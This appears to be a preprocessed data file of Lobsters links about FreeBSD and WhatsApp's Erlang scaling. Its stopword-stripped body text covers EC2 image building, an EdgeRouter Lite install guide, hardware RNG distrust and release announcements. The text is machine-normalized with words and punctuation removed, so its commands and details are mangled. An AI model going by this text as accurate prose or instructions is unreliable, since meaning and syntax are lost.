running connection mostly idle handle connection connection busy per connection contention biggest issue fix erlang code reduce beam contention issue patched beam partitioning workload work cross processor lot timeofday lock every time message delivered port look update timeofday single lock across scheduler mean cpu hitting one lock optimized use timer wheel removed bif timer check io time table grows arithmetically created vm thrashing hash table would reallocated various point improved use geometric allocation table added write file take port already open reduce port contention mseg allocation single point contention across allocator make per scheduler lot port transaction accepting connection set option reduce expensive port interaction message queue backlog became large garbage collection would destabilize system pause gc queue shrunk avoiding common thing come price backported tse time counter freebsd cheaper read timer fast get time day le expensive going chip backported igp network driver freebsd issue multiple queue nics locking increase number file socket pmcstat showed lot time spent looking pcbs network stack bumped size hash table make lookup faster beam patch previously mentioned instrumentation patch instrument scheduler get utilization information statistic message queue number sleep send rate message count etc done erlang code procinfo million connection slow stats collection efficient gather run production stats kept different decay interval second interval allows seeing issue time make lock counting work larger async thread count added debug option debug lock counter tuning set scheduler wake threshold low scheduler would go sleep would never wake prefer mseg allocator malloc allocator per instance per scheduler configure carrier size start big get bigger cause freebsd use super page reduced tlb thrash rate improves throughput cpu run beam realtime priority thing like cron job interrupt schedule prevents glitch would cause backlog important user traffic patch dial spin count scheduler spin mnesia prefer o timestamp erlang using transaction remote replication ran backlog parallelized replication table increase throughput actually lot change made lesson optimization dark grungy work suitable troll engineer rick going change made get million connection server mind numbing notice immense amount work went writing tool running test backporting code adding gob instrumentation nearly every level stack tuning system looking trace mucking low level detail trying understand everything take remove bottleneck order increase performance scalability extreme level get data need write tool patch tool add knob ken relentless extending system get data needed constantly writing tool script data needed manage optimize system whatever take measure remove bottleneck test repeat erlang rock erlang continues prove capability versatile reliable highperformance platform though personally tuning patching required cast doubt claim crack virality code profit virality allusive quality whatsapp show figure man worth lot money value employee count officially divorced lot forcemultipliers world today advanced global telecom infrastructure make apps like whatsapp possible whatsapp make network phone etc would never happen powerful cheap hardware open source software availability course another multiplier right place right time right product front right buyer something brutal focus user idea whatsapp focussed simple messaging app gaming network advertising network disappearing photo network worked guided ad stance ability keep app simple adding feature overall brainer work philosohpy phone limit cause simplicity ok identity tied phone number change phone number identity gone uncomputer like make entire system much simpler design age thing age discrimination prevented whatsapp cofounder brian acton getting job twitter facebook shame shame shame start simply customize chat launched initially server side based ejabberd since completely rewritten initial step erlang direction experience scalability reliability operability erlang initial use case led broader broader use keep server count low constantly work keep server count low possible leaving enough headroom event create shortterm spike usage analyze optimize point diminishing return hit effort deploy hardware purposely overprovision hardware ensures user uninterrupted service festivity employee able enjoy holiday without spending whole time fixing overload issue growth stall charge money growth super fast whatsapp free downloads day early day switching paid declined day end year adding picture messaging settled charging onetime download fee later modified annual payment inspiration come strangest place experience forgetting username password skype account drove passion making app work related article hacker news keynote benedict evans incontext related slide whatsapp benedict evans whatsapp blog telling diary billion dollar startup nice timeline event andre bourque rick change erlang github whatsapp blog whatsapp inside story open source project used whatsapp whatsapp facebook erlang realtime messaging started ejabberd quora whatsapp work whatsapp work mobile network whatsapp grow big whatsapp broken really broken early security problem whatsapp ceo jan koum hate advertising tech rumor mill full dive video singapore progressively business whatsapp four number explain facebook acquired whatsapp announcement mark zuckerberg millionuser comet application mochiweb part inside erlang rare programming language behind whatsapp success whatsapp actually worth say facebook zuckerberg internetorg sealed deal facebook buy whatsapp billion value pricing perspective facebook billion craving explained mark zuckerberg imho lesson learned whatsapp may use whatsapp rest world sure whatsapp story challenge valley conventional wisdom whatsapp right according jan koum video facebook buy whatsapp someone explain whatsapp valuation google unusual offer whatsapp
652,Lobsters,freebsd,FreeBSD,How to build FreeBSD/EC2 images,http://www.daemonology.net/blog/2014-02-16-FreeBSD-EC2-build.html,build image,build image image published configinit panicmail defenestration image code view forum thread blog comment powered,build image building image past three year based email receiving people either using image directly modifying create image suit need however people want build image ab initio often company product built customized version freebsd helped people better help needed end earlier today published code building freebsd amis core process two step first building disk image second turning ami process building disk image start platform slice partition disk create filesystem extract freebsd bit release iso prior freebsd complex task since custom kernel needed built freebsd xen hvm support generic kernel ship release isos installed clean freebsd system disk image add extra code support using image amazon consists four port freebsd port tree truly essential port contains code configuring system allow logins using ssh public key provided via logging ssh host key console handling configinit data allow instance provided configuration parameter launched sysutilsfirstbootfreebsdupdate port downloads installs update freebsd base system instance first boot important since may many important security erratum update ami created instance launched month year later sysutilsfirstbootpkgs port downloads installs freebsd package code compiled port tree instance first boot make possible instance launched newer code available ami created together functionality provided configinit make possible launch new freebsd instance available moment later set software installed ready use sysutilspanicmail port particularly specific although earlier version code image long time panicmail system provides automated mechanism reporting freebsd kernel panic centralized location hoping prove useful identifying fixing stability issue related platform occuring freebsd environment finally disk image completed making configuration file change suit environment boot loader menu default login terminal kgdb debugger disabled since provide sort virtual keyboard could used access network configured use dhcp sshd enabled aforementioned port enabled configured created disk image task build code performs writing directly elastic block store volume convenience second step turn ami made complex bit history amazon first created using xen one virtualization method available namely paravirtualization pv short used later virtualization gained popularity intel amd added support cpu hardware virtualization xen hvm mode born stuck working namely pv mode unfortunately freebsd need xen hvm mode later hybrid mode amazon announced support running microsoft window inside also needed xen hvm mode higher price due window license involved operating system world freebsd also linux vendor continued move towards taking advantage hardware virtualization finally july amazon announced first cluster compute instance hvm support past three year new instance type fully supported hvm reason single disk image build two amis one pretend window higher window hourly pricing run instance type one run modern instance type standard unix hourly pricing ideal world creating window ami disk image would require single api call add window label ala ideal instead use trick call defenestration launch window instance throw window detaching deleting boot disk attach freebsd disk image root disk tell create ami window instance since know instance launched window ami affix window label automatically nt rebundling window instance would nt work providing hvm environment freebsd need well window tax nt creating unix hvm image hand single api call api call month ago people could nt make reason sure one ca nt imagine amazon first made hvm available cluster compute instance decided keep process creating hvm image secret fortunately right people within amazon knew work nondisclosure agreement provided special api tool code set allowed create hvm image flag aws account far thing amazon quietly done help something confirmed talk publicly fortunately amazon changed stance hvm image creation month ago virtualizationtype parameter registerimage api call publicly available documented able share image building code publicly rather limiting people signed amazon ndas currently building window unix image imagine point stop building window image mentioned new instance type since support running freebsd without window label amazon released image type price nt many situation left would make sense run one older instance type think freebsd user still find easiest continue using image publishing people want build image code fun view forum thread blog comment powered
653,Lobsters,freebsd,FreeBSD,FreeBSD 10.0 on Ubiquiti EdgeRouter Lite,http://rtfm.net/FreeBSD/ERL/,freebsd ubiquiti edgerouter lite,freebsd ubiquiti edgerouter lite update update build script cavium octeon build getting started device serial console cable adapter serial console skip next section minicom source realterm installation software ubuntu image writer configuring uboot growing filesystem success freebsd handbook building via freebsd handbook script grow filesystem installation instruction contact erl rtfmnet,freebsd ubiquiti edgerouter lite update new image available update new version build script creates inodes root filesystem ubiquiti edgerouter lite neat little device cost le u three ethernet port run freebsdmips based cavium octeon platform feature dual core processor ram storage removable usb edgerouter lite foreground near netgear bulky ispprovided cablemodem page provides readytouse image recent freebsd release thanks open nature edgerouter lite easy install use image follow instruction thanks fine folk freebsd project building almost easy script build along instruction also provided special thanks due juli mallett warner losh without whose hard work generous assistance none would possible note experimental software come warranty kind build work progress fit suitable purpose whatsoever proceeding assume risk edgerouter lite build provided stable pretty much fully functional two outstanding issue performance could little better though adequate home internet connection basic packet passing two gigabit host seems top currently way pas boot option singleuser mode kernel uboot hardware crypto acceleration via devcrypto seems work use aes cbc mode see huge speedup ctr also easily build image freebsd source using provided mkerlimage script return continue installation getting started need following computer usb port device serial console cable unless computer already serial port adapter last certainly least phillipshead screwdriver edgerouter lite onboard storage removable usb drive installing image matter opening device taking drive writing image putting back edgerouter lite cover removed inside board removable usb storage right configuring bootloader afterwards take minute done nt already set serial console device though need first serial console may wish skip next section already working connection serial console edgerouter lite serial console allows interact device firmware boot need configure boot freebsd since need anyway provided image nt enable ssh server default log new freebsd system first time way well first connect console cable port marked console device connect end serial port computer one otherwise connect adapter connect usb port computer next need serial communication software freebsd linux system install minicom entering one following command system command freebsd pkg install minicom freebsd pkgadd r minicom debian ubuntu mint etc aptget install minicom fedora centos rhel etc yum install minicom unixlike system try building minicom source macos try install fink window try realterm determine name serial port using freebsd system usb serial adapter name like hardwired serial port lowercase u linux system equivalent file respectively one number might greater window usually called otherwise macos might devcuusbserial look devcu file configure software use port setting flow control usually close default important get right accidentally leaving flow control enabled another error could leave partially working connection configure minicom enter command minicom root navigate serial port setup menu start software plug power device see edgeos linux kernel boot ultimately present login prompt device already powered hit enter key twice get new login prompt type something login prompt verify connection working properly example log edgeos default user password ubnt run halt command shut prepare installing freebsd installation unplug device completely open plastic case removing screw notice lone usb port containing removable drive one end board use finger take drive little slippery might need use shirt grip turn benefit wearing shirt around house plug drive computer freebsd linux unixlike system command write image drive need download xz software macos otherwise installed window nt dd try ubuntu image writer also download xz determine device name assigned system freebsd something like first available number scsi usb drive linux something like devsdf f first available letter ata scsi usb drive macos something like ensure nt mounted automatically substituting device name following command running root mount grep devdevicename awk print xargs umount mount grep devdevicename command produce output certain device name correct proceed following command root substituting device name filename image downloaded built warning simple typo device name wipe system boot partition check carefully hitting enter key xzcat freebsdubiquitiedgerouterlitedebugimagexz dd ofdevdevicename take minute finished remove drive put back edgerouter lite reconnect console cable ensure terminal software running plug power device configuring uboot first time power device new image bootloader wo nt know drop prompt enter command save command sequence needed boot freebsd variable bootfreebsd example setenv bootfreebsd fatload usb loadaddr kernelkernel bootoctlinux loadaddr saveenv boot freebsd simply entering command run bootfreebsd optionally enter following command skip preboot countdown personally using minicom still able access uboot console sending break first sign life serial port prefer delay nt want risk locking uboot console skip command replace something like second setenv bootdelay finally boot directly freebsd default enter command setenv bootcmdorig bootcmd setenv bootcmd run bootfreebsd saveenv reset growing filesystem point looking fully booted multiuser freebsd system one first thing want expand filesystem use free space left drive wrote relatively small image log root enter command bring system singleuser mode init press enter accept default shell enter following command df h mount ro gpart resize gpart resize growfs df h able see much available space second df invocation enter reboot command reboot back multiuser mode success change root password edit etcrcconf file set networking service refer freebsd handbook system administration basic building update device pf pflog added default kernel config also available via git change history update latest version fix problem inodes first spotted maximilian präger build version freebsd source also need computer running version freebsd wish build freebsd version old newer source tree buildworld may fail recommend first building installing booting version source build system plan crossbuild router refer freebsd handbook information obtaining freebsd source buildworld process updating freebsd system even use another o install freebsd inside virtual machine use build version edgerouter lite mkerlimage script everything needed build image fresh copy freebsd source performs following step sysmipsconferl nt exist creates simple one based configuration set targetmips invokes buildworld buildkernel build base system kernel invokes installworld distribution install newly built system temporary root package whole thing image consisting msdos partition kernel uboot read ufs fileystem rest note always grow filesystem size medium installing booting image please review script running particular make sure check following freebsd build system store intermediate object file usrobj default build require least free space set makeobjdirprefix environment variable want put somewhere else script requires least temporary space hold installation root ufs image final result image compression check temproot setting top script go tmp default check number job makeargs setting top script appropriate build machine success xzcompressed image ready decompress dd onto destination follow installation instruction contact author page reached erl rtfmnet
654,Lobsters,freebsd,FreeBSD,Generating Morse Code in the Console,http://lists.freebsd.org/pipermail/freebsd-questions/2013-October/253641.html,generating morse code console,ring bell freebsd edvaxde information freebsdquestions mailing list,ring bell polytropon freebsd edvaxde mon oct utc mon oct frank leonhardt wrote goodol day could make unix ring bell literally sending console tty case ah famous g control character electronic synthesised ting beep terminal emulator got sound card ibmpc beep routine bios terminal beep routine primarily address system speaker located connected mainboard side effect sound card possible logitech soundman feature really relation way make noise built bell speaker found ibm pc compatible server box writing bios cout routine might realised nt got clue making audible part local terminal emulator either tty text mode driver via xterm preferred alternative terminal emulator x simple printf shell prompt sufficient note running x make sure bell disabled example put xset b xinitrc xsession respectively sophisticated interface provided soon kernel device speaker compiled speakerko loaded play wonderful music speaker see man speaker detail see following shell script example binsh read p cw text echo text morse awk length printf else gsub dit gsub di gsub dah printf dd ofdevspeaker devnull feel free add support reading stdin listen console message piped script always make sure system actually got internal speaker assume modern pc hardware could removed along floppy drive connector parallel port power switch p cdcontrol f devmycdrom eject best come far getting attention really clever idea never heared advantage permanent drive stay open sound motor finished polytropon magdeburg germany happy freebsd user since andra moi ennepe mousa information freebsdquestions mailing list
655,Lobsters,freebsd,FreeBSD,The 10 Best Features Of FreeBSD 10.0,http://www.phoronix.com/scan.php?page=news_item&px=MTU2MDQ,best feature freebsd,freebsd amd radeon km support bhyve llvm clang default microsoft long contributing linux kernel freebsd wiki,bit luck freebsd released next day look arguably ten best feature next major bsd operating system release phoronix perspective ten best feature freebsd listed particular order amd radeon km support finally made bsd world recent linux kernel code opensource amd drmkms graphic driver ported freebsd along updated userspace mesa code allow accelerated rendering hardware better performance gpus finally mean able display right resolution bsd system big step forward intel km landed freebsd still using nvidia binary driver likely best bet freebsd desktop user bhyve hypervisor merged providing new virtualization support freebsd server still though likely time byhve truly compete xen linux kvm popular lowcost raspberry pi arm development board finally work freebsd also arm freebsd architecture improvement next release zfs filesystem improvement freebsd bsd distribution continue advancing opensource zfs filesystem support freebsd zfs trim support solidstate drive write optimization compression support compression support various filesystem optimization zfs improvement ported illumos codebase usb audio support improved significantly new hardware support bandwidth optimization increased sampling frequency change llvm clang default cc compiler freebsd base system place gcc gnu compiler collection continue available via freebsd port llvmclang preferred compiler liberal licensing fast build time lower memory use reason complementing byhve support freebsd also support microsoft hyperv hypervisor freebsd support running guest microsoft virtualization platform done microsoft along netapp citrix microsoft long contributing linux kernel virtual driver committing freebsd intel aesni instruction support speeding encryptiondecryption task freebsd also support intel rdrand bull mountain hardware random number generator freebsd nt making exclusive reliance hardware random number generator though given recent nsa snowden allegation improved wifi networking suport improvement kernel stack support three stream configuration new hardware support atheros hardware one big winner wireless networking improvement similar note mesh support added well fuse part freebsd base system better promoting filesystems userspace better ntfs support freebsd one notable fusebased driver also growing number fuse filesystems previously fuse available port many detail freebsd change found via freebsd wiki stay tuned phoronix official freebsd announcement day ahead
656,Lobsters,freebsd,FreeBSD,"“We cannot trust” Intel and Via’s chip-based crypto, FreeBSD developers say",http://arstechnica.com/security/2013/12/we-cannot-trust-intel-and-vias-chip-based-crypto-freebsd-developers-say/,trust intel via chipbased crypto freebsd developer say,decode vast swath internet encrypted traffic yarrow meeting minute earlier year separate meeting minute contain nsaengineered backdoor critical exploit recently allowed thief pilfer bitcoins recently discovered crippling weakness taiwan secure digital id system,post updated december make clear freebsd history nt possible use rdrand padlock sole source random number fed devrandom engine developer freebsd operating system continue preventing user trusting processor manufactured intel via technology sole source random number needed generate cryptographic key ca nt easily cracked government spy adversary decision effective upcoming freebsd version come three month secret document leaked former national security agency nsa subcontractor edward snowden said u spy agency able decode vast swath internet encrypted traffic among way new york time pro publica guardian reported september nsa british counterpart defeat encryption technology working chipmakers insert backdoor cryptographic weakness product revelation playing role decision freebsd continue restricting use hardwarebased random number generator seed data used ensure cryptographic system ca nt easily broken adversary specifically rdrand padlock provided intel via source freebsd us directly feed random number devrandom engine used generate random data unixbased operating system case freebsd possible use pseudo random output rdrand padlock seed devrandom passed separate rng algorithm known yarrow yarrow turn add entropy data ensure intentional backdoor unpatched weakness hardware generator ca nt used adversary predict output going backtrack remove rdrand padlock backends feed yarrow instead delivering output directly devrandom freebsd developer said meeting minute earlier year still possible access hardware random number generator rdrand padlock etc directly inline assembly using openssl userland required trust separate meeting minute developer specifically invoked snowden name discussing decision edward snowdon sic v high probability backdoor hw rngs note read referring hardware rngs alluding dual ecdrbg rng forged national institute standard technology said contain nsaengineered backdoor note read including elliptic curve generator included nist rdrand ivbridge implemented intel trust hw rngs provide good entropy directly rdrand implemented microcode intel add opcode go directly hw mean partial revert work rdrand padlock meeting came shortly freebsd patch third party submitted july gave user ability use rdrand padlock direct source randomness update committed without proper review established policy next week part removed recommitted freebsd security officer dagerling smørgrav told ar change finally removed altogether october aside brief span earlier year freebsd release ever shipped option feed bit stream hardware pseudorandom number generator directly devrandom smørgrav said smørgrav went say corporate user long expressed wish freebsd allow run raw feed rdrand underlying algorithm listed approved deterministic rng fips standard defense contractor government worker required follow using line code freebsd user use rdrand directly userland rather use kernel feed directly boil stand way freebsd user want use hwrngs neither endorse felt providing kernel interface would amount implicit endorsement underlying hardware smørgrav wrote email rngs one important ingredient secure cryptographic system akin dice shaker used board game ensure full range randomness contained roll adversary reduce amount entropy rng produce devise way predict output frequently devise way crack key needed decrypt otherwise unreadable message weakness devrandom engine found google android operating system instance root cause critical exploit recently allowed thief pilfer bitcoins user digital wallet rdrand source random data provided ivy bridge later version intel processor padlock seed random data chip made via freebsd developer discussing distrust cited allegation backdoor raised document leaked snowden move good idea even weakness never came light adding additional source randomness rdrand padlock rngs reduce entropy may make key help generate harder crack relying multiple source randomness good practice possibly could helped prevent recently discovered crippling weakness taiwan secure digital id system
657,Lobsters,freebsd,FreeBSD,FreeBSD 10.0-RC1 now available,http://lists.freebsd.org/pipermail/freebsd-stable/2013-December/076231.html,freebsd available,freebsd available gjb freebsdorg ftp http http ftp http information freebsdstable mailing list,freebsd available glen barber gjb freebsdorg mon dec utc first rc build release cycle available ftp server powerpc architecture please see change list important note regarding bsdinstall zfs geli option image checksum follow end email iso image architecture support memory stick image available ftp freebsd mirror site notice problem report normal gnat pr system current mailing list would like use svn source based update existing system use branch important note freebsdupdate user please sure follow instruction following freebsd erratum notice upgrading system http http preinstalled virtual machine image also available architecture image located snapshot directory ftp ftp disk image available vhd vmdk format image download size approximately mb decompress sparse image partition layout freebsdboot gpt partition type bootfs gpt label freebsdswap gpt partition type swapfs gpt label freebsdufs gpt partition type rootfs gpt label change include fix regression bsdinstall prevents zfs geli installation working correctly please note lastminute problem found testing installation option still investigated please select geli encryption option installer although installation successfully completes geli passphrase decrypt geli provider build hyperv kernel module default update oce driver support device improve robustness xen balloon driver fix accounting hwrealmem platform fix poweroff xenserver fix powerdstates amd cpu add support fix pkgabi detection bsdconfig fix emulated byte order fix hang reboot active iscsi connection fix potential system crash jail created destroyed system vimage iso checksum powerpc vm image checksum glen next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdstable mailing list
658,Lobsters,freebsd,FreeBSD,FreeBSD Project Falls Short of Year End Funding Target By Over 50%,http://slashdot.org/submission/3171031/freebsd-project-falls-short-of-year-end-funding-target-by-over-50,freebsd project fall short year end funding target,slashdot apparel back shop tool improvement linkedin,slashdot apparel back shop develop github keep using github automatically sync github release sourceforge quickly easily tool take advantage sourceforge massive reach check sourceforge improvement follow slashdot linkedin
659,Lobsters,freebsd,FreeBSD,FreeBSD 10.0-RELEASE status update,http://lists.freebsd.org/pipermail/freebsd-stable/2013-November/076015.html?lobsters,freebsd status update,status update gjb freebsdorg http information freebsdstable mailing list,status update glen barber gjb freebsdorg sat nov utc quick status update iconv change made head merged today two mfcs undergoing review one commit right updating branch name reflect build begin tomorrow schedule page website updated reflect start build well updating remainder schedule reflect adjustment delay important note tracking update committed tomorrow disable automatic creation pkgconf installing new system experience trouble update pkg version available around time announced affect pkg bootstrap functionality bootstrapped pkg affected sourcebased upgrade pkg already bootstrapped brief day brief relative window time pkg version le preconfigured pkgconf also noted announcement mail believe nonissue since usrsbinpkgconfigc pkgfreebsdorg set packagesite sure overlooking something obvious prove wrong important note longer actual status update thank patience glen behalf next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdstable mailing list
660,Lobsters,freebsd,FreeBSD,"ruBSD 2013 Has Theo de Raadt, Henning Brauer, and Mike Belopuhov Speaking",http://undeadly.org/cgi?action=article&sid=20131126113154&mode=expanded&count=0,rubsd theo de raadt henning brauer mike belopuhov speaking,jcr rubsd conference translated yandex openbsd b web service gmbh vantronix secure system,contributed jcr thisisnt dept rubsd conference translated take place saturday december moscow russia yandex hold conference office extropolis hall rubsd first russian technical conference family operating system bsd intended system administrator programmer objective conference lighting new technology bsd world discus example bsdbased system participation free register necessary seat limited register come please let u know advance three openbsd related talk theo de raadt deraadt openbsd bane backwards compatibility henning brauer henning b web service gmbh openbsd pf design implementation future mike belopuhov mikeb vantronix secure system openbsd crypto going
662,Lobsters,freebsd,FreeBSD,Official FreeBSD Binary Packages now available for pkgng,http://lists.freebsd.org/pipermail/freebsd-announce/2013-October/001510.html,official freebsd binary package available pkgng,freebsdannounce official freebsd binary package available pkgng bdrewery freebsdorg http pkgfreebsdorg abi http information freebsdannounce mailing list,freebsdannounce official freebsd binary package available pkgng bryan drewery bdrewery freebsdorg thu oct utc pleased announce official binary package available pkg next generation package management tool freebsd pkg allows either use port portmasterportupgrade binary remote package without port binary package available head pkg default starting freebsd pkginstall suite tool pkgcreate pkgadd pkginfo port also use deprecated discontinued roughly month communication regarding deprecation pkginstall suite tool sent separately future currently using pkg wish run following root sure add withpkgngyes makeconf pkg installed cd usrportsportsmgmtpkg make install clean echo withpkgngyes etcmakeconf either continue use port portmasterportupgrade switch using binary package use binary package ensure pkg uptodate pkg v say least first upgrade port remove repositoryspecific configuration usrlocaletcpkgconf packagesite mirrortype pubkey leaf pkgconf empty remove mkdir p usrlocaletcpkgrepos create file usrlocaletcpkgreposfreebsdconf freebsd url http pkgfreebsdorg abi latest mirrortype srv enabled yes note pkgfreebsdorg browsable web page dns record intended srv host pkg know properly use use pkg search browse available package repository mirror may use instead global pkgfreebsdorg pkgeufreebsdorg pkguseastfreebsdorg pkguswestfreebsdorg system ready use package refer handbook section pkgng usage http also see man pkg example pkg help package built weekly snapshot port collection every wednesday morning utc typically available repository day pkg released coming month bring many improvement including officially signed package freebsd pkg bootstrap also support signed pkg installation regard bryan drewery behalf portmgr information freebsdannounce mailing list
663,Lobsters,freebsd,FreeBSD,FreeBSD and Commercial Workloads: Managed Services at NYI,http://www.freebsdfoundation.org/press/Managed%20Services%20Using%20FreeBSD%20at%20NYI.pdf,freebsd commercial workload managed service nyi,,
664,Lobsters,freebsd,FreeBSD,FreeBSD 10.0 Now In Beta With Faster ZFS LZJB,http://lists.freebsd.org/pipermail/freebsd-stable/2013-October/075504.html,freebsd beta faster zfs lzjb,freebsd available gjb freebsdorg ftp http wwwfreebsdorgdocenbookshandbooksvnmirrorshtml ftp http information freebsdstable mailing list,freebsd available glen barber gjb freebsdorg mon oct utc first beta build release cycle available ftp server powerpc architecture image checksum follow end email iso image architecture support memory stick image available ftp freebsd mirror site notice problem report normal gnat pr system current mailing list would like use svn source based update existing system use branch important note freebsdupdate user due last minute problem found freebsdupdate build freebsdupdate supported upgrade please use freebsdupdate upgrade please aware cvsup cv supported method updating src tree also note due size image portstxz distribution included however expected included subsequent build release cycle port tree fetched either portsnap utility using svnlite using mirror listed http wwwfreebsdorgdocenbookshandbooksvnmirrorshtml change include introduce freebsdversion intended used auditing tool determine userland patch level differs uname r report improve zfs lzjb decompress performance add two new mips cpu family jail jname rcconf variable perjail configuration automatically converted varrunjail jname conf jail utility invoked new jailconf syntax used remove atf tool atf user update random please note following possible random loaded kernel module via kldload using generic system kernel configuration excludes device random please include random kernel configuration file fix issue pending review expected fixed update bsdinstall please note following introduces number update bsdinstall notably ability install full zfs filesystem please keep mind experimental feature using zfs installation option enabled fulldisk encryption enabled entry need manually added loaderconf bootpool zpool available system boot manual step expected fixed entry need added zpoolcacheload yes zpoolcachetype bootzfszpoolcache zpoolcachename bootzfszpoolcache done final menu bsdinstall prompted boot newlyinstalled system alternatively done postinstall case following must run appending loaderconf zpool import f bootpool preinstalled virtual machine image also available architecture image located snapshot directory ftp ftp disk image available vmdk format image download size approximately mb decompress sparse image partition layout freebsdboot gpt partition type bootfs gpt label freebsdswap gpt partition type swapfs gpt label freebsdufs gpt partition type rootfs gpt label iso checksum powerpc vm image checksum glen next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdstable mailing list
665,Lobsters,freebsd,FreeBSD,"FreeBSD 10.0-ALPHA5 available, removes BIND, GNU ar, ranlib from the base system",http://lists.freebsd.org/pipermail/freebsd-current/2013-October/045097.html,freebsd available remove bind gnu ar ranlib base system,freebsd available gjb freebsdorg ftp http information freebsdcurrent mailing list,freebsd available glen barber gjb freebsdorg mon oct utc fifth alpha build release cycle available ftp server powerpc architecture build correlate svn revision head branch image checksum follow end email iso image architecture support memory stick image available ftp freebsd mirror site notice problem report normal gnat pr system current mailing list would like use svn source based update existing system use head branch please aware cvsup cv supported method updating src tree important note freebsdupdate user freebsdupdate supported upgrade path build change include removal bind base system replacement may found within port collection bug fix introduced latest infiniband update gnu ar ranlib removed base system bug fix update base llvm various bhyve enhancement various xen enhancement checksum powerpc glen next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdcurrent mailing list
666,Lobsters,freebsd,FreeBSD,FreeBSD 9.2-RELEASE Now Available,http://lists.freebsd.org/pipermail/freebsd-announce/2013-September/001504.html,freebsd available,freebsdannounce freebsd available gjb freebsdorg http http http wwwfreebsdorgreleng http wwwfreebsdmallcom ftp ftp ftp yourdomain http http http wwwfreebsdorgsecurity http kensmith freebsdorg mva freebsdorg gjb freebsdorg kib freebsdorg joel freebsdorg blackend freebsdorg skreuzer freebsdorg erwin freebsdorg delphij freebsdorg simon freebsdorg jpaetzel freebsdorg cperciva freebsdorg rodrigc freebsdorg hr freebsdorg glebius freebsdorg de freebsdorg marius freebsdorg rwatson freebsdorg http information freebsdannounce mailing list,freebsdannounce freebsd available glen barber gjb freebsdorg mon sep utc freebsd release engineering team pleased announce availability freebsd second release branch improves stability freebsd introduces new feature highlight zfs filesystem support trim used solid state drive virtio driver added generic kernel configuration architecture zfs filesystem support compression openssl updated version dtrace hook enabled default generic kernel dtrace updated version sendmail updated version openssh updated version import unmapped io support head complete list new feature known problem please see online release note erratum list available http http information freebsd release engineering activity please see http wwwfreebsdorgreleng availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded via ftp described section smaller ftp mirror may carry architecture generally contain common one hash release iso memory stick image included bottom message purpose image provided part release follows contains everything necessary install base freebsd operating system documentation small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain support installing freebsd cd would need perform network based install eg ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product freebsd mall inc http wwwfreebsdmallcom ftp time announcement following ftp site freebsd available ftp however trying site please check regional mirror first going ftp ftp yourdomain freebsdorgpubfreebsd additional mirror site labeled information freebsd mirror site found http instruction installing freebsd updating existing machine please see http support freebsd supported endoflife date found http wwwfreebsdorgsecurity project based freebsd many third party project based freebsd project range repackaging freebsd novice friendly distribution making freebsd available amazon infrastructure information third party project see http acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium sentex communication new york internet juniper network ixsystems release engineering team includes ken smith kensmith freebsdorg release engineering lead marcus von appen mva freebsdorg release engineering glen barber gjb freebsdorg release engineering release engineer konstantin belousov kib freebsdorg release engineering joel dahl joel freebsdorg release engineering marc fonvieille blackend freebsdorg release engineering documentation steven kreuzer skreuzer freebsdorg release engineering erwin lansing erwin freebsdorg package building xin li delphij freebsdorg release engineering security simon l b nielsen simon freebsdorg security officer emeritus josh paetzel jpaetzel freebsdorg release engineering colin percival cperciva freebsdorg security officer emeritus craig rodrigues rodrigc freebsdorg release engineering hiroki sato hr freebsdorg release engineering documentation gleb smirnoff glebius freebsdorg release engineering dagerling smørgrav de freebsdorg security officer marius strobl marius freebsdorg release engineering robert watson rwatson freebsdorg release engineering security trademark freebsd registered trademark freebsd foundation iso image checksum powerpc glen next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdannounce mailing list
667,Lobsters,freebsd,FreeBSD,FreeBSD 10's New Technologies and Features,http://www.freebsdnews.net/2013/09/20/freebsd-10s-new-technologies-and-features/,freebsd new technology feature,freebsd two alpha release schedule freebsd wiki page general pkgng pkgng llvmclang llvmclang unmapped vmio buffer libc libc variable symlinks kernel tickle kernel amd kernel modesetting new iscsi stack rdrand rdrand km startup networking bind replacement unbound pf firewall smp support pf firewall netmap netmap carp carp wifi improvement hardware support pci hotplug apple thunderbolt usb audio freebsdarm raspberry pi filesystems zfs zfs trim compression na file server ufs fuse virtualisation bhyve bhyve bhyve virtio paravirtualisation virtualbox xen vps,freebsd work freebsd became available january month later freebsd shaping nicely two alpha release available testing according release schedule freebsd receive release status november since developer aim quality product speed release may slip dec jan lot maturing technology freebsd many new feature make release think exciting one year lot development gone virtualisation support virtualisation freebsd jail available long time much full virtualisation let look talked requested interesting feature found way planned may make deadline detail link feature commits found freebsd wiki page general pkgng pkgng new package management tool freebsd llvmclang freebsd deprecate gpllicensed gcc switch bsdlicensed llvmclang compiler default gcc still source tree switched platform llvm support fully arm easily built add withgccyes etcsrcconf make cusrsrc buildworld installworld thanks de clarification unmapped vmio buffer use unmapped buffer eliminate need perform tlb shootdown mapping buffer creation reuse greatly reducing amount ipis shootdown bigsmp machine eliminating system time io intensive workload libc libc integrated freebsd libc library focused upon support licensed mituiuc license rather gpl used instead libstdc variable symlinks support variable symbolic link varsym support automatic expansion perprocess perjail systemwide variable symbolic file link may make final release kernel tickle kernel freebsd support truly tickle kernel enhancing battery performance laptop general resource effectiveness virtual machine amd kernel modesetting amd gpus kernel mode setting support use newer driver amd gpus new iscsi stack new iscsi stack kernelmode focused reliability interoperability rdrand intel bull mountain rdrand cpu instruction set ivy bridge haswell cpu random number generator access supported freebsd km new xorg stack initial km support kernel modesetting support freebsd still level support found linux intel radeon nouveau hardware making good progress startup uefi bootloader support may make final release animated boot splash support networking bind replacement unbound lnds replace bind system dns resolver bind still available port pf firewall smp support pf firewall smpfriendly support finegrain locking better utilisation cpu multi core machine mean greater performance due multithreading netmap netmap framework highperformance raw ethernet packet access paragraph updated thanks ed carp carp support overhauled rewritten ground wifi improvement improved wifiwlan wireless networking stack support new feature new driver eg atheros pcipcie wifi adapter qualcomm smpconcurrency race tx aggregation hardware support pci hotplug support may get included apple 